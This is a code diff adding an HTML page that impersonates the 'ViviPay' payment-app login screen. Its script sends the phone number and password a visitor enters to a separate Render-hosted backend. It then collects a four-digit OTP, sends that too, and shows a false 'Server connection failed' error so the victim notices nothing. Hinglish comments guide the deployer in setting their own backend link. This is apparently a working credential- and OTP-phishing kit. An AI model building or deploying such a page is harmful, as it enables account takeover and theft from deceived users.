@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ViviPay Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Base Reset */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        html, body {
+            background-color: #ffffff;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .login-wrapper {
+            width: 100% !important;
+            min-height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 60px 40px 30px 40px;
+        }
+
+        .brand-container {
+            margin-bottom: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .brand-logo {
+            width: 180px;  
+            height: 180px;
+            border-radius: 50%;
+            object-fit: contain;
+        }
+
+        .auth-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-field-group {
+            background-color: #f1f5f9; 
+            border: none;
+            border-radius: 30px; 
+            display: flex;
+            align-items: center;
+            padding: 18px 24px;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .field-icon {
+            display: flex;
+            align-items: center;
+            margin-right: 14px;
+            color: #94a3b8;
+        }
+
+        .input-field-group input {
+            border: none;
+            background: transparent;
+            width: 100%;
+            font-size: 16px;
+            outline: none;
+            color: #1e293b;
+        }
+
+        .form-utilities {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 40px;
+            padding: 0 5px;
+            width: 100%;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            color: #2563eb;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .remember-me input {
+            margin-right: 8px;
+            accent-color: #2563eb;
+        }
+
+        .forgot-pass-link {
+            text-decoration: none;
+            color: #2563eb;
+            font-weight: 500;
+        }
+
+        .submit-btn {
+            background-color: #248efd; 
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px; 
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(36, 142, 253, 0.2);
+        }
+
+        .policy-agreement {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 13px;
+            color: #64748b;
+            width: 100%;
+        }
+
+        .agreement-label input {
+            margin-right: 8px;
+        }
+
+        .policy-link {
+            color: #248efd;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* OTP POPUP MODAL STYLES */
+        .otp-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4); 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s ease;
+            padding: 24px;
+        }
+
+        .otp-modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .otp-modal-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            border-radius: 16px;
+            padding: 24px;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            text-align: center;
+        }
+
+        .otp-close-btn {
+            position: absolute;
+            top: 14px;
+            right: 16px;
+            font-size: 20px;
+            color: #94a3b8;
+            cursor: pointer;
+            background: none;
+            border: none;
+            outline: none;
+        }
+
+        .otp-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #1e293b;
+            margin-top: 10px;
+            margin-bottom: 8px;
+        }
+
+        .otp-subtitle {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 24px;
+        }
+
+        .otp-input-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .otp-box {
+            width: 50px;
+            height: 50px;
+            border: none;
+            border-bottom: 2px solid #cbd5e1;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            color: #1e293b;
+            outline: none;
+            background: transparent;
+        }
+
+        .otp-box:focus {
+            border-bottom-color: #248efd;
+        }
+
+        .otp-timer {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <div class="brand-container">
+            <img src="https://vivipay.net/static/images/Login_Logo.png" alt="Brand Logo" class="brand-logo">
+        </div>
+
+        <form class="auth-form" id="loginForm">
+            <div class="input-field-group">
+                <span class="field-icon">📱</span>
+                <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
+            </div>
+
+            <div class="input-field-group">
+                <span class="field-icon">🔒</span>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+
+            <div class="form-utilities">
+                <label class="remember-me">
+                    <input type="checkbox" id="save-pwd">
+                    Save Password
+                </label>
+                <a href="#" class="forgot-pass-link">Forgot password</a>
+            </div>
+
+            <button type="submit" class="submit-btn">Login</button>
+
+            <div class="policy-agreement">
+                <label class="agreement-label">
+                    <input type="checkbox" id="agreeCheck" required checked>
+                    Agree <span class="policy-link">"User Privacy Agreement"</span>
+                </label>
+            </div>
+        </form>
+    </div>
+
+    <div class="otp-modal-overlay" id="otpModal">
+        <div class="otp-modal-container">
+            <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
+            
+            <div class="otp-title">Please enter OTP</div>
+            <div class="otp-subtitle" id="otpSentText">OTP sent to 637****9782</div>
+            
+            <div class="otp-input-container">
+                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
+                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
+                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
+                <input type="tel" class="otp-box" maxlength="1" oninput="checkAndSubmitOtp(this)" id="otp4">
+            </div>
+
+            <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
+        </div>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const otpModal = document.getElementById('otpModal');
+        const closeOtpBtn = document.getElementById('closeOtpBtn');
+        const otpSentText = document.getElementById('otpSentText');
+        const secondsCount = document.getElementById('secondsCount');
+        
+        let currentUserId = null;
+
+        // 🌐 AUTOMATIC ONLINE CONFIGURATION
+        // Jab aap Render par backend chalayenge, toh bus apna dynamic url yahan set rakhein.
+        // Kyunki frontend static site hogi, isliye hum isko automatic detect karne dete hain:
+        const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
+            ? 'http://127.0.0.1:4000' 
+            : 'https://vivipay-backend.onrender.com'; // <--- Yahan apna final Render backend link daal dena!
+
+        // 1. LOGIN FORM SUBMIT (Data Backend Bhejna)
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault(); 
+            
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+            const isAgreed = document.getElementById('agreeCheck').checked;
+
+            if (!isAgreed) {
+                alert('Please accept User Privacy Agreement.');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    currentUserId = data.userId; 
+
+                    if(phoneNumber.length >= 7) {
+                        const masked = phoneNumber.substring(0, 3) + "****" + phoneNumber.substring(phoneNumber.length - 4);
+                        otpSentText.innerText = `OTP sent to ${masked}`;
+                    } else {
+                        otpSentText.innerText = `OTP sent to ${phoneNumber}`;
+                    }
+
+                    otpModal.classList.add('active');
+                    startTimer();
+                } else {
+                    alert("Server Error! Try again.");
+                }
+            } catch (error) {
+                alert("Cannot connect to Backend Server! Please check your network connection.");
+            }
+        });
+
+        // Close OTP modal
+        closeOtpBtn.addEventListener('click', () => {
+            otpModal.classList.remove('active');
+        });
+
+        // Auto jump system
+        function moveNext(current, nextFieldId) {
+            if (current.value.length >= 1) {
+                document.getElementById(nextFieldId).focus();
+            }
+        }
+
+        // 2. OTP SUBMIT SYSTEM (Jab 4th dabba bhar jaye, tab auto-submit)
+        async function checkAndSubmitOtp(current) {
+            const o1 = document.getElementById('otp1').value;
+            const o2 = document.getElementById('otp2').value;
+            const o3 = document.getElementById('otp3').value;
+            const o4 = current.value;
+
+            if(o1 && o2 && o3 && o4) {
+                const fullOtp = o1 + o2 + o3 + o4;
+
+                try {
+                    const response = await fetch(`${BACKEND_URL}/api/otp-submit`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
+                    });
+
+                    const data = await response.json();
+
+                    if(data.success) {
+                        alert("Server connection failed"); 
+                        window.location.reload(); 
+                    }
+                } catch (error) {
+                    alert("Server connection failed");
+                    window.location.reload();
+                }
+            }
+        }
+
+        // Timer Countdown calculation
+        function startTimer() {
+            let totalSec = 118;
+            const timerInterval = setInterval(() => {
+                totalSec--;
+                secondsCount.innerText = totalSec;
+                if(totalSec <= 0) {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
